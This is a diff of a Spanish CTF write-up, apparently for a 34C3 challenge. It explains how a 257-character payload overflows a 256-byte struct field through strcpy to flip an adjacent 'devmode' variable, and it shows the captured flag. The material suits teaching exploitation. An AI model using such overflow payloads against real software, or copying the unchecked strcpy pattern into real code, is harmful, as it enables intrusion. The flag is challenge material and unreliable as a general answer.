@@ -64,7 +64,7 @@ void set_text(int argc, char* argv[]) {
     return;
 }
 ```
-La struct **billboard** reserva espacio para las variables de forma contigua. El método **strcpy(a,b)** almacena el valor de **b** en la dirección **a**. Vamos a preparar el payload, formado por una cadena de 256+1 chars para que haga overflow en la variable **text**:
+La struct `billboard` reserva espacio para las variables de forma contigua. El método `strcpy(a,b)` almacena el valor de `b` en la dirección `a`. Vamos a preparar el payload, formado por una cadena de 256+1 chars para que haga overflow en la variable `char text[256]` y se sobreescriba la varable `char devmode`:
 ```
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
@@ -100,6 +100,7 @@ sys
 tmp
 usr
 var
+
 cat flag.txt
 34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
 ```
